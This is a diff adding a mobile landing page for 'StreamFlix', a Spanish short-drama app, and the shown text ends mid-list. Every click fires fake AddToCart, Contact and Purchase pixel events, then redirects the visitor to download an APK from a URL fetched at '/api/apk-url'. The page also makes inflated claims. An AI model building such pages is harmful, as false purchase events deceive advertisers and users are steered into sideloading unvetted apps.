@@ -1,0 +1,1394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+
+
+ 
+
+
+       <script>
+// Facebook Pixel — 动态从后台加载所有像素ID
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+
+// 从后台 API 获取所有像素ID并初始化
+fetch('/api/pixels')
+.then(function(r){return r.json()})
+.then(function(d){
+  var ids=d.ids||[];
+  if(!ids.length){ console.warn('像素ID列表为空，请前往后台配置'); return; }
+  console.log('已加载像素ID:',ids); for(var i=0;i<ids.length;i++){ fbq('init',ids[i]); }
+  fbq('track','PageView');
+  // 动态插入 noscript 备用图
+  var ns=document.createElement('div');
+  ns.style.display='none';
+  ns.innerHTML=ids.map(function(id){return '<img height="1" width="1" src="https://www.facebook.com/tr?id='+id+'&ev=PageView&noscript=1"/>'}).join('');
+  document.body.appendChild(ns);
+})
+.catch(function(){
+  console.warn('像素ID获取失败，请检查后台配置');
+});
+</script>
+<!-- End Meta Pixel Code -->
+
+   <script>
+// ========== k2 — 动态获取APK下载地址并跳转 ==========
+var _apkUrl='';
+async function k2(source){
+    fbq('track', 'AddToCart');
+    fbq('track', 'Contact');
+    fbq('track', 'Purchase');
+    try{
+        if(!_apkUrl){
+            var r=await fetch('/api/apk-url');
+            var d=await r.json();
+            _apkUrl=d.url; console.log('APK下载地址:',_apkUrl);
+        }
+        if(_apkUrl) window.location.href=_apkUrl;
+        else alert('获取APK下载地址失败，请稍后重试');
+    }catch(e){
+        alert('获取APK下载地址失败，请稍后重试');
+    }
+}
+</script>
+
+
+
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+<title>StreamFlix — Series Cortas en tu Bolsillo</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=DM+Serif+Display:ital@0;1&display=swap" rel="stylesheet">
+<style>
+/* ============================================================
+   RESET
+   ============================================================ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{
+  scroll-behavior:smooth;
+  -webkit-text-size-adjust:100%;
+  -webkit-tap-highlight-color:transparent;
+  overflow-x:hidden;
+}
+body{
+  font-family:'Inter',system-ui,-apple-system,sans-serif;
+  background:#080612;
+  color:#EEECF2;
+  line-height:1.6;
+  -webkit-font-smoothing:antialiased;
+  overscroll-behavior-y:auto;
+  overflow-x:hidden;overflow-y:auto;
+  -webkit-overflow-scrolling:touch;
+  max-width:100vw;
+}
+img,svg{display:block;max-width:100%}
+button{font:inherit;cursor:pointer;border:none;outline:none;background:none;color:inherit}
+a{color:inherit;text-decoration:none}
+
+/* ============================================================
+   DESIGN TOKENS — Vibrant Midnight
+   ============================================================ */
+:root{
+  --bg-root:#080612;
+  --bg-card:#110E1E;
+  --bg-card-alt:#161226;
+  --bg-surface:#1A1530;
+  --bg-press:#1F1938;
+  --border-soft:rgba(255,255,255,0.06);
+  --border-mid:rgba(255,255,255,0.10);
+  --fg:#EEECF2;
+  --fg-dim:#A099B8;
+  --fg-muted:#6B6380;
+  --pink:#FF4672;
+  --pink-soft:rgba(255,70,114,0.12);
+  --pink-glow:rgba(255,70,114,0.3);
+  --violet:#A259FF;
+  --violet-soft:rgba(162,89,255,0.12);
+  --violet-glow:rgba(162,89,255,0.25);
+  --cyan:#00E4B8;
+  --cyan-soft:rgba(0,228,184,0.1);
+  --amber:#FFB443;
+  --amber-soft:rgba(255,180,67,0.12);
+  --radius-sm:6px;
+  --radius:12px;
+  --radius-lg:18px;
+  --radius-xl:24px;
+  --radius-full:9999px;
+  --shadow-sm:0 1px 2px rgba(0,0,0,0.2);
+  --shadow-md:0 4px 16px rgba(0,0,0,0.3);
+  --shadow-lg:0 12px 40px rgba(0,0,0,0.4);
+  --ease-smooth:cubic-bezier(0.22,0.61,0.36,1);
+  --ease-bounce:cubic-bezier(0.34,1.56,0.64,1);
+}
+
+/* ============================================================
+   AMBIENT GRADIENT ORBS
+   ============================================================ */
+.ambient-layer{
+  position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;
+}
+.ambient-spot{
+  position:absolute;border-radius:50%;filter:blur(100px);opacity:0.35;
+}
+.ambient-spot.a1{
+  width:300px;height:300px;
+  background:radial-gradient(circle,rgba(255,70,114,0.22),transparent 70%);
+  top:-10%;left:-20%;
+}
+.ambient-spot.a2{
+  width:240px;height:240px;
+  background:radial-gradient(circle,rgba(162,89,255,0.2),transparent 70%);
+  top:35%;right:-15%;
+}
+.ambient-spot.a3{
+  width:200px;height:200px;
+  background:radial-gradient(circle,rgba(0,228,184,0.14),transparent 70%);
+  bottom:10%;left:5%;
+}
+
+/* ============================================================
+   PAGE CONTAINER
+   ============================================================ */
+.page-content{max-width:480px;margin:0 auto;position:relative;z-index:1}
+
+/* ============================================================
+   HERO
+   ============================================================ */
+.hero{padding:4px 16px 36px}
+.hero-badge{
+  display:inline-flex;align-items:center;gap:7px;
+  padding:5px 12px;border-radius:var(--radius-full);
+  background:var(--pink-soft);border:1px solid rgba(255,70,114,0.2);
+  font-size:0.6875rem;font-weight:700;letter-spacing:0.05em;
+  text-transform:uppercase;color:var(--pink);
+  margin-bottom:22px;
+}
+.hero-badge-dot{
+  width:6px;height:6px;border-radius:50%;
+  background:var(--pink);
+  box-shadow:0 0 8px var(--pink-glow);
+  animation:blink 1.6s ease-in-out infinite;
+}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+.hero-title{
+  font-family:'DM Serif Display',serif;
+  font-size:clamp(2.5rem,10vw,3.5rem);
+  font-weight:400;line-height:1.05;letter-spacing:-0.02em;
+  margin-bottom:8px;
+}
+.hero-title em{
+  font-style:italic;
+  background:linear-gradient(135deg,var(--pink),var(--violet));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+  position:relative;
+}
+.hero-subtitle{
+  font-size:0.9375rem;color:var(--fg-dim);line-height:1.55;
+  margin-bottom:28px;max-width:320px;
+}
+
+/* Filmstrip */
+.filmstrip{
+  display:flex;gap:8px;overflow-x:auto;
+  scroll-snap-type:x mandatory;
+  -webkit-overflow-scrolling:touch;
+  scrollbar-width:none;
+  padding-bottom:8px;margin-bottom:24px;
+}
+.filmstrip::-webkit-scrollbar{display:none}
+.filmstrip-item{
+  flex:0 0 122px;scroll-snap-align:start;
+  border-radius:var(--radius);
+  overflow:hidden;position:relative;
+  aspect-ratio:2/3;
+  box-shadow:0 8px 24px rgba(0,0,0,0.5);
+  background:var(--bg-card);
+  border:1px solid var(--border-soft);
+}
+.filmstrip-item img{width:100%;height:100%;object-fit:cover;display:block}
+.filmstrip-overlay{
+  position:absolute;inset:0;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(0,0,0,0.45);
+  opacity:0;transition:opacity 0.25s;
+}
+.filmstrip-item:active .filmstrip-overlay{opacity:1}
+.filmstrip-play{
+  width:40px;height:40px;border-radius:50%;
+  background:linear-gradient(135deg,var(--pink),#E8325E);
+  color:#fff;display:flex;align-items:center;justify-content:center;
+  box-shadow:0 4px 20px var(--pink-glow);
+}
+.filmstrip-play svg{width:15px;height:15px;margin-left:2px}
+
+/* Hero metrics */
+.hero-metrics{
+  display:flex;gap:0;margin-bottom:28px;
+  border-radius:var(--radius-lg);
+  overflow:hidden;
+  background:var(--bg-card);
+  border:1px solid var(--border-soft);
+}
+.hero-metric{
+  flex:1;text-align:center;padding:18px 8px;
+}
+.hero-metric+.hero-metric{border-left:1px solid var(--border-soft)}
+.hero-metric-value{
+  font-family:'DM Serif Display',serif;
+  font-size:1.5rem;line-height:1;margin-bottom:3px;
+}
+.hero-metric-value.pink{color:var(--pink)}
+.hero-metric-value.violet{color:var(--violet)}
+.hero-metric-value.amber{color:var(--amber)}
+.hero-metric-label{
+  font-size:0.625rem;font-weight:500;color:var(--fg-muted);
+  text-transform:uppercase;letter-spacing:0.05em;
+}
+
+/* Hero CTA */
+.hero-btn{
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  width:100%;min-height:56px;
+  border-radius:var(--radius-full);
+  background:linear-gradient(135deg,var(--pink),#E8325E);
+  color:#fff;font-size:0.9375rem;font-weight:700;
+  box-shadow:0 8px 32px var(--pink-glow),0 0 0 4px rgba(255,70,114,0.08);
+  transition:all 0.2s var(--ease-smooth);
+  position:relative;overflow:hidden;
+}
+.hero-btn::before{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(135deg,transparent 30%,rgba(255,255,255,0.12) 50%,transparent 70%);
+  transform:translateX(-100%);
+}
+.hero-btn:active{transform:scale(0.97);box-shadow:0 4px 16px var(--pink-glow)}
+.hero-btn:active::before{transform:translateX(100%);transition:transform 0.5s}
+.hero-btn svg{width:18px;height:18px;flex-shrink:0}
+.hero-footnote{
+  text-align:center;margin-top:12px;
+  font-size:0.6875rem;color:var(--fg-muted);
+}
+
+/* ============================================================
+   SECTION BASE
+   ============================================================ */
+.section{padding:44px 16px}
+.section-line{
+  width:36px;height:3px;border-radius:2px;
+  background:linear-gradient(90deg,var(--pink),var(--violet));
+  margin-bottom:22px;
+}
+.section-kicker{
+  font-size:0.6875rem;font-weight:700;letter-spacing:0.1em;
+  text-transform:uppercase;color:var(--pink);
+  margin-bottom:8px;
+}
+.section-heading{
+  font-family:'DM Serif Display',serif;
+  font-size:1.75rem;font-weight:400;line-height:1.15;letter-spacing:-0.01em;
+  margin-bottom:8px;
+}
+.section-heading em{font-style:italic;color:var(--violet)}
+.section-desc{
+  font-size:0.875rem;color:var(--fg-dim);line-height:1.6;margin-bottom:24px;
+}
+
+/* ============================================================
+   TRENDING — vertical list
+   ============================================================ */
+.trending-list{display:flex;flex-direction:column;gap:6px}
+.trending-row{
+  display:flex;align-items:center;gap:14px;
+  padding:13px 14px;border-radius:var(--radius-lg);
+  background:var(--bg-card);border:1px solid var(--border-soft);
+  transition:all 0.2s var(--ease-smooth);
+  cursor:pointer;
+}
+.trending-row:active{background:var(--bg-press);border-color:var(--border-mid)}
+.trending-rank{
+  font-family:'DM Serif Display',serif;
+  font-size:2rem;color:rgba(255,255,255,0.06);
+  min-width:32px;text-align:center;line-height:1;
+}
+.trending-poster{
+  width:100px;height:140px;min-width:100px;
+  border-radius:var(--radius-sm);
+  overflow:hidden;
+  box-shadow:0 4px 12px rgba(0,0,0,0.4);
+  position:relative;
+}
+.trending-poster img{width:100%;height:100%;object-fit:cover}
+.trending-poster-tag{
+  position:absolute;top:-2px;left:-2px;
+  padding:2px 7px;border-radius:3px;
+  font-size:0.5625rem;font-weight:700;letter-spacing:0.03em;
+  color:#fff;line-height:1.6;
+}
+.trending-poster-tag.hot{background:var(--pink)}
+.trending-poster-tag.new{background:var(--violet)}
+.trending-poster-tag.top{background:var(--amber);color:#080612}
+.trending-body{flex:1;min-width:0}
+.trending-body-label{font-size:0.625rem;color:var(--fg-muted);text-transform:uppercase;letter-spacing:0.05em;margin-bottom:1px}
+.trending-body-title{font-size:0.875rem;font-weight:700;letter-spacing:-0.01em;margin-bottom:2px}
+.trending-body-desc{font-size:0.6875rem;color:var(--fg-dim);line-height:1.45;margin-bottom:4px}
+.trending-body-meta{display:flex;align-items:center;gap:10px;margin-top:1px}
+.trending-body-meta span{font-size:0.6875rem;color:var(--fg-dim);display:flex;align-items:center;gap:3px}
+.trending-body-meta svg{width:10px;height:10px;color:var(--amber)}
+.trending-body-meta .meta-tag{font-size:0.5625rem;font-weight:600;letter-spacing:0.04em;text-transform:uppercase;padding:2px 6px;border-radius:3px;color:var(--fg-dim);background:rgba(255,255,255,0.04)}
+.trending-play{
+  width:38px;height:38px;min-width:38px;
+  border-radius:50%;
+  background:linear-gradient(135deg,var(--pink),#E8325E);
+  color:#fff;display:flex;align-items:center;justify-content:center;
+  box-shadow:0 4px 16px var(--pink-glow);
+  transition:all 0.2s var(--ease-smooth);
+}
+.trending-play svg{width:14px;height:14px;margin-left:2px}
+.trending-play:active{transform:scale(0.9)}
+
+/* ============================================================
+   STATS STRIP
+   ============================================================ */
+.stats-strip{
+  display:flex;gap:0;margin-top:20px;
+  border-radius:var(--radius-lg);overflow:hidden;
+  background:var(--bg-card);border:1px solid var(--border-soft);
+}
+.stat-block{
+  flex:1;text-align:center;padding:20px 8px;
+}
+.stat-block+.stat-block{border-left:1px solid var(--border-soft)}
+.stat-block-num{
+  font-family:'DM Serif Display',serif;
+  font-size:1.75rem;line-height:1;margin-bottom:3px;
+}
+.stat-block-num.p{color:var(--pink)}
+.stat-block-num.v{color:var(--violet)}
+.stat-block-num.a{color:var(--amber)}
+.stat-block-lbl{
+  font-size:0.625rem;font-weight:500;color:var(--fg-muted);
+  text-transform:uppercase;letter-spacing:0.05em;
+}
+
+/* ============================================================
+   FEATURES — stacked rows
+   ============================================================ */
+.feature-stack{display:flex;flex-direction:column;gap:10px}
+.feature-row{
+  display:flex;align-items:flex-start;gap:16px;
+  padding:20px;border-radius:var(--radius-lg);
+  background:var(--bg-card);border:1px solid var(--border-soft);
+  transition:all 0.2s var(--ease-smooth);
+}
+.feature-row:active{background:var(--bg-press)}
+.feature-icon{
+  width:48px;height:48px;min-width:48px;
+  border-radius:var(--radius);
+  display:flex;align-items:center;justify-content:center;
+}
+.feature-icon.pink{background:var(--pink-soft);color:var(--pink)}
+.feature-icon.violet{background:var(--violet-soft);color:var(--violet)}
+.feature-icon.amber{background:var(--amber-soft);color:var(--amber)}
+.feature-icon.cyan{background:var(--cyan-soft);color:var(--cyan)}
+.feature-icon svg{width:22px;height:22px}
+.feature-info{flex:1;min-width:0}
+.feature-info h4{font-size:0.9375rem;font-weight:700;margin-bottom:2px;letter-spacing:-0.01em}
+.feature-info p{font-size:0.8125rem;color:var(--fg-dim);line-height:1.5}
+
+/* ============================================================
+   FEATURE BANNER — gradient card
+   ============================================================ */
+.feature-banner{
+  margin-top:14px;padding:28px 20px;
+  border-radius:var(--radius-xl);
+  background:linear-gradient(145deg,var(--bg-surface),#1F1540);
+  border:1px solid rgba(162,89,255,0.18);
+  position:relative;overflow:hidden;
+}
+.feature-banner-glow{
+  position:absolute;top:-30px;right:-30px;
+  width:120px;height:120px;border-radius:50%;
+  background:radial-gradient(circle,rgba(162,89,255,0.2),transparent 70%);
+  pointer-events:none;
+}
+.feature-banner h3{
+  font-family:'DM Serif Display',serif;
+  font-size:1.375rem;font-weight:400;margin-bottom:18px;
+  position:relative;letter-spacing:-0.01em;
+}
+.feature-banner ul{list-style:none;display:flex;flex-direction:column;gap:14px;position:relative}
+.feature-banner ul li{
+  display:flex;align-items:flex-start;gap:10px;
+  font-size:0.8125rem;color:var(--fg-dim);line-height:1.5;
+}
+.feature-banner ul li .dot{
+  width:6px;height:6px;min-width:6px;border-radius:50%;
+  background:var(--violet);margin-top:7px;
+  box-shadow:0 0 8px var(--violet-glow);
+}
+.feature-banner ul li strong{color:var(--fg)}
+
+/* ============================================================
+   REVIEWS — quote cards
+   ============================================================ */
+.review-stack{display:flex;flex-direction:column;gap:12px}
+.review-card{
+  padding:24px 20px;border-radius:var(--radius-lg);
+  background:var(--bg-card);border:1px solid var(--border-soft);
+  position:relative;
+}
+.review-card::after{
+  content:'';position:absolute;top:0;left:0;width:3px;height:30px;
+  border-radius:0 0 3px 0;
+}
+.review-card:nth-child(1)::after{background:var(--pink)}
+.review-card:nth-child(2)::after{background:var(--violet)}
+.review-card:nth-child(3)::after{background:var(--cyan)}
+.review-quote{
+  font-size:0.9375rem;color:var(--fg-dim);line-height:1.6;
+  font-style:italic;margin-bottom:16px;
+  position:relative;padding-left:18px;
+}
+.review-quote::before{
+  content:'\201C';position:absolute;left:0;top:-6px;
+  font-family:'DM Serif Display',serif;
+  font-size:2.5rem;
+  background:linear-gradient(135deg,var(--pink),var(--violet));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+  line-height:1;
+}
+.review-stars-row{display:flex;gap:2px;margin-bottom:12px}
+.review-stars-row svg{width:16px;height:16px;color:var(--amber)}
+.review-author{
+  display:flex;align-items:center;gap:10px;
+}
+.review-avatar{
+  width:36px;height:36px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:0.75rem;font-weight:700;color:#fff;
+}
+.review-avatar.pink{background:linear-gradient(135deg,var(--pink),#E8325E)}
+.review-avatar.violet{background:linear-gradient(135deg,var(--violet),#7B3FE0)}
+.review-avatar.cyan{background:linear-gradient(135deg,var(--cyan),#00B896)}
+.review-name{font-size:0.8125rem;font-weight:600}
+.review-tag{font-size:0.6875rem;color:var(--fg-muted)}
+
+/* ============================================================
+   NUMBER GRID
+   ============================================================ */
+.number-grid{
+  display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:20px;
+}
+.number-card{
+  padding:22px 16px;border-radius:var(--radius-lg);
+  background:var(--bg-card);border:1px solid var(--border-soft);
+  text-align:center;
+}
+.number-big{
+  font-family:'DM Serif Display',serif;
+  font-size:2.25rem;line-height:1;margin-bottom:4px;
+}
+.number-big.pink{color:var(--pink)}
+.number-big.violet{color:var(--violet)}
+.number-big.cyan{color:var(--cyan)}
+.number-big.amber{color:var(--amber)}
+.number-sm{
+  font-size:0.625rem;color:var(--fg-muted);
+  text-transform:uppercase;letter-spacing:0.05em;font-weight:600;
+}
+
+/* ============================================================
+   SECURITY — row list
+   ============================================================ */
+.security-list{display:flex;flex-direction:column;gap:0}
+.security-row{
+  display:flex;align-items:center;gap:14px;
+  padding:18px 0;
+  border-bottom:1px solid var(--border-soft);
+}
+.security-row:last-child{border-bottom:none}
+.security-icon{
+  width:44px;height:44px;min-width:44px;
+  border-radius:var(--radius);
+  background:var(--cyan-soft);color:var(--cyan);
+  display:flex;align-items:center;justify-content:center;
+}
+.security-icon svg{width:20px;height:20px}
+.security-text{flex:1;min-width:0}
+.security-text strong{display:block;font-size:0.875rem;font-weight:600;margin-bottom:2px}
+.security-text span{font-size:0.75rem;color:var(--fg-dim);line-height:1.4}
+
+/* ============================================================
+   DOWNLOAD ZONE — gradient panel
+   ============================================================ */
+.download-zone{
+  margin:0 16px 44px;padding:38px 20px;
+  border-radius:var(--radius-xl);
+  background:linear-gradient(160deg,#1A1140,#200E28,#1A1128);
+  border:1px solid rgba(162,89,255,0.15);
+  text-align:center;position:relative;overflow:hidden;
+}
+.download-zone-glow{
+  position:absolute;top:-50px;left:50%;transform:translateX(-50%);
+  width:200px;height:200px;border-radius:50%;
+  background:radial-gradient(circle,rgba(255,70,114,0.1),transparent 70%);
+  pointer-events:none;
+}
+.download-zone h2{
+  font-family:'DM Serif Display',serif;
+  font-size:1.75rem;font-weight:400;margin-bottom:8px;
+  position:relative;
+}
+.download-zone h2 em{
+  font-style:italic;
+  background:linear-gradient(135deg,var(--pink),var(--amber));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.download-zone p{
+  font-size:0.875rem;color:var(--fg-dim);margin-bottom:26px;
+  max-width:280px;margin-left:auto;margin-right:auto;
+  position:relative;
+}
+.download-btns{display:flex;flex-direction:column;gap:8px;max-width:280px;margin:0 auto 16px;position:relative}
+.dl-btn{
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  min-height:52px;border-radius:var(--radius-full);
+  font-size:0.9375rem;font-weight:700;
+  transition:all 0.2s var(--ease-smooth);
+}
+.dl-btn:active{transform:scale(0.96)}
+.dl-btn.primary{
+  background:linear-gradient(135deg,var(--pink),#E8325E);color:#fff;
+  box-shadow:0 10px 32px var(--pink-glow);
+}
+.dl-btn.ghost{
+  background:rgba(255,255,255,0.05);color:var(--fg);
+  border:1px solid var(--border-mid);
+}
+.dl-btn svg{width:18px;height:18px;flex-shrink:0}
+.qr-block{
+  display:inline-block;padding:8px;border-radius:var(--radius);
+  background:#fff;position:relative;
+}
+.qr-block svg{display:block}
+.qr-note{font-size:0.6875rem;color:var(--fg-muted);margin-top:10px;position:relative}
+
+/* ============================================================
+   FAQ
+   ============================================================ */
+.faq-stack{display:flex;flex-direction:column;gap:0}
+.faq-entry{border-bottom:1px solid var(--border-soft)}
+.faq-entry:last-child{border-bottom:none}
+.faq-entry-q{
+  display:flex;align-items:center;justify-content:space-between;gap:12px;
+  padding:18px 0;font-size:0.875rem;font-weight:600;
+  cursor:pointer;user-select:none;
+  -webkit-tap-highlight-color:transparent;
+  min-height:52px;text-align:left;width:100%;
+  transition:color 0.2s;
+}
+.faq-entry.open .faq-entry-q{color:var(--pink)}
+.faq-entry-indicator{
+  width:22px;height:22px;min-width:22px;
+  display:flex;align-items:center;justify-content:center;
+  transition:transform 0.3s var(--ease-smooth);
+  color:var(--fg-muted);
+}
+.faq-entry.open .faq-entry-indicator{transform:rotate(45deg);color:var(--pink)}
+.faq-entry-indicator svg{width:14px;height:14px}
+.faq-entry-a{
+  max-height:0;overflow:hidden;
+  transition:max-height 0.4s var(--ease-smooth),padding 0.4s var(--ease-smooth);
+}
+.faq-entry.open .faq-entry-a{max-height:400px}
+.faq-entry-a-inner{
+  padding:0 0 18px;
+  font-size:0.8125rem;color:var(--fg-dim);line-height:1.65;
+}
+
+/* ============================================================
+   FOOTER
+   ============================================================ */
+.page-footer{
+  text-align:center;padding:24px 16px;
+  font-size:0.6875rem;color:var(--fg-muted);
+  border-top:1px solid var(--border-soft);
+}
+.page-footer a{color:var(--fg-dim);transition:color 0.2s}
+.page-footer a:active{color:var(--pink)}
+
+/* ============================================================
+   FLOATING BAR
+   ============================================================ */
+.float-bar{
+  position:fixed;bottom:0;left:0;right:0;z-index:100;
+  padding:10px 16px max(10px,env(safe-area-inset-bottom));
+  background:rgba(8,6,18,0.9);
+  backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+  border-top:1px solid var(--border-soft);
+  transform:translateY(100%);
+  transition:transform 0.35s var(--ease-smooth),pointer-events 0s 0.35s;
+  pointer-events:none;
+  display:flex;align-items:center;
+}
+.float-bar.on{transform:translateY(0);pointer-events:auto;transition:transform 0.35s var(--ease-smooth),pointer-events 0s 0s}
+.float-bar-btn{
+  flex:1;min-height:52px;
+  border-radius:var(--radius-full);
+  background:linear-gradient(135deg,var(--pink),#E8325E);color:#fff;
+  font-size:0.9375rem;font-weight:700;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  box-shadow:0 8px 28px var(--pink-glow);
+  transition:all 0.15s var(--ease-smooth);
+}
+.float-bar-btn:active{transform:scale(0.97)}
+.float-bar-btn svg{width:18px;height:18px}
+
+/* ============================================================
+   SCROLL REVEAL
+   ============================================================ */
+.reveal{opacity:0;transform:translateY(20px);transition:opacity 0.6s var(--ease-smooth),transform 0.6s var(--ease-smooth)}
+.reveal.visible{opacity:1;transform:translateY(0)}
+
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:0.01ms!important;animation-iteration-count:1!important;transition-duration:0.01ms!important}
+}
+</style>
+</head>
+<body>
+
+<!-- Ambient -->
+<div class="ambient-layer">
+  <div class="ambient-spot a1"></div>
+  <div class="ambient-spot a2"></div>
+  <div class="ambient-spot a3"></div>
+</div>
+
+
+<div class="page-content">
+
+<!-- ============================================================
+     HERO
+     ============================================================ -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="hero-badge-dot"></span>
+    <span data-i18n="hero_eyebrow">#1 App de Series Cortas · 2026</span>
+  </div>
+
+  <h1 class="hero-title">
+    <span data-i18n="hero_title_a">Dramas cortos,</span> <em data-i18n="hero_title_b">emociones grandes</em>
+  </h1>
+  <p class="hero-subtitle" data-i18n="hero_desc">Miles de series cortas verticales. Mira 1 episodio en 60 segundos. Descarga y ve sin conexion. Nuevos dramas cada dia. Sin anuncios.</p>
+
+  <div class="filmstrip">
+    <div class="filmstrip-item" onclick="k2()"><img src="img/1.jpg" alt="De Repente CASADOS"><div class="filmstrip-overlay"><div class="filmstrip-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div></div></div>
+    <div class="filmstrip-item" onclick="k2()"><img src="img/2.jpg" alt="Sr. DENVER"><div class="filmstrip-overlay"><div class="filmstrip-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div></div></div>
+    <div class="filmstrip-item" onclick="k2()"><img src="img/3.jpg" alt="Swapped Heiress"><div class="filmstrip-overlay"><div class="filmstrip-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div></div></div>
+    <div class="filmstrip-item" onclick="k2()"><img src="img/4.jpg" alt="Un Matrimonio al Rojo Vivo"><div class="filmstrip-overlay"><div class="filmstrip-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div></div></div>
+    <div class="filmstrip-item" onclick="k2()"><img src="img/5.jpg" alt="Estrella de Fútbol"><div class="filmstrip-overlay"><div class="filmstrip-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div></div></div>
+    <div class="filmstrip-item" onclick="k2()"><img src="img/6.jpg" alt="Ruling Over All I See"><div class="filmstrip-overlay"><div class="filmstrip-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div></div></div>
+  </div>
+
+  <div class="hero-metrics">
+    <div class="hero-metric">
+      <div class="hero-metric-value pink">50M+</div>
+      <div class="hero-metric-label" data-i18n="hero_stat1">Usuarios</div>
+    </div>
+    <div class="hero-metric">
+      <div class="hero-metric-value violet">4.8★</div>
+      <div class="hero-metric-label" data-i18n="hero_stat2">Series</div>
+    </div>
+    <div class="hero-metric">
+      <div class="hero-metric-value amber">Episodios de 1 Min</div>
+      <div class="hero-metric-label" data-i18n="hero_stat3">Series Diarias</div>
+    </div>
+  </div>
+
+  <button class="hero-btn" onclick="k2()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+    <span data-i18n="hero_cta">Descargar Gratis — Ver Ahora</span>
+  </button>
+  <p class="hero-footnote" data-i18n="scroll_hint">Desliza</p>
+</section>
+
+<!-- ============================================================
+     TRENDING
+     ============================================================ -->
+<section class="section reveal">
+  <div class="section-line"></div>
+  <div class="section-kicker" data-i18n="trending_label">Tendencias</div>
+  <h2 class="section-heading">
+    <span data-i18n="trending_h_a">Lo que todos</span><br><em data-i18n="trending_h_b">estan viendo</em>
+  </h2>
+  <p class="section-desc" data-i18n="trending_sub">Series cortas mas populares. Nuevas cada dia.</p>
+
+  <div class="trending-list">
+    <div class="trending-row" onclick="k2()">
+      <div class="trending-rank">1</div>
+      <div class="trending-poster">
+        <img src="img/1.jpg" alt="De Repente CASADOS" loading="lazy">
+        <span class="trending-poster-tag hot">Romance</span>
+      </div>
+      <div class="trending-body">
+        <div class="trending-body-label">Romance</div>
+        <div class="trending-body-title">De Repente CASADOS</div>
+        <div class="trending-body-desc">Traicionada por su novio, acepta un matrimonio por conveniencia con un frío CEO multimillonario.</div>
+        <div class="trending-body-meta">
+          <span><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.9</span>
+          <span class="meta-tag">Romance</span>
+          <span class="meta-tag">2026</span>
+        </div>
+      </div>
+      <div class="trending-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div>
+    </div>
+    <div class="trending-row" onclick="k2()">
+      <div class="trending-rank">2</div>
+      <div class="trending-poster">
+        <img src="img/2.jpg" alt="Sr. DENVER" loading="lazy">
+        <span class="trending-poster-tag new">Éxito</span>
+      </div>
+      <div class="trending-body">
+        <div class="trending-body-label">Éxito</div>
+        <div class="trending-body-title">Sr. DENVER</div>
+        <div class="trending-body-desc">Versión en español del exitoso IP "Mr Denver". Historia de superación masculina.</div>
+        <div class="trending-body-meta">
+          <span><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.8</span>
+          <span class="meta-tag">Drama</span>
+          <span class="meta-tag">2026</span>
+        </div>
+      </div>
+      <div class="trending-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div>
+    </div>
+    <div class="trending-row" onclick="k2()">
+      <div class="trending-rank">3</div>
+      <div class="trending-poster">
+        <img src="img/3.jpg" alt="Swapped Heiress by My Bestie" loading="lazy">
+        <span class="trending-poster-tag top">TOP</span>
+      </div>
+      <div class="trending-body">
+        <div class="trending-body-label">TOP</div>
+        <div class="trending-body-title">Swapped Heiress by My Bestie</div>
+        <div class="trending-body-desc">Identidad equivocada: la madre de la verdadera heredera busca venganza y justicia.</div>
+        <div class="trending-body-meta">
+          <span><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.7</span>
+          <span class="meta-tag">Venganza</span>
